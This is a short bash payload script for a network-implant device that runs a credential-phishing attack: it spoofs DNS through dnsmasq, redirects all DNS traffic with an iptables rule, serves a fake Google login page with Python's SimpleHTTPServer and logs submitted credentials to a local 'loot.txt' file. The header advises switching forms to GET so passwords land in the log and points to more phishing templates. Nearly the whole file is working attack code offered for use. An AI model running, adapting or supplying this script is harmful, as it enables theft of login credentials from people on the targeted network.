#!/bin/bash
# 
# Title:		Phishing
# Description:  DNSSpoof + SimpleHTTPServer to run a simple phishing attack storing the loot locally, see the "loot.txt" file
# 				Default settings and phishing template is for Google.com login, change the content of the "html" folder to change website content. 
#				You can find way more templates here -> https://github.com/wifiphisher/extra-phishing-pages
#				Credits to the guys behind the WifiPhisher project. 
# 				Just be sure to change the form submit method to "GET" and not "POST" for new templates
#
#				remember to run "chmod +x payload.sh" after moving over the files.
# Author: 		SkiddieTech (Creds to HAK5 for the DNSSpoof payload this is built on)
# Version:		1.0
# Category: 		interception
# Target: 		Any
# Net Mode:		NAT


function setup() {
	# Show SETUP LED
	LED SETUP

	# Set the network mode to NAT
	NETMODE NAT
	sleep 5

	# Copy the spoofhost file to /tmp/dnsmasq.address
	cp $(dirname ${BASH_SOURCE[0]})/spoofhost /tmp/dnsmasq.address &> /dev/null

	# Restart dnsmasq with the new configuration
	/etc/init.d/dnsmasq restart	

	#Navigate to the correct dir
	cd "$(dirname "${BASH_SOURCE[0]}")/html/"

	#Clean old loot file
	echo > ../loot.txt
 
	#Start HTTP server and log everthing to the "loot.txt" file
	python -m SimpleHTTPServer 80 2>&1 | tee ../loot.txt &
	sleep 9

}

function run() {
	# Show  ATTACK LED
	LED ATTACK

	# Redirect all DNS traffic to ourselves
	iptables -A PREROUTING -t nat -i eth0 -p udp --dport 53 -j REDIRECT --to-port 53	
	
	
}

setup
run
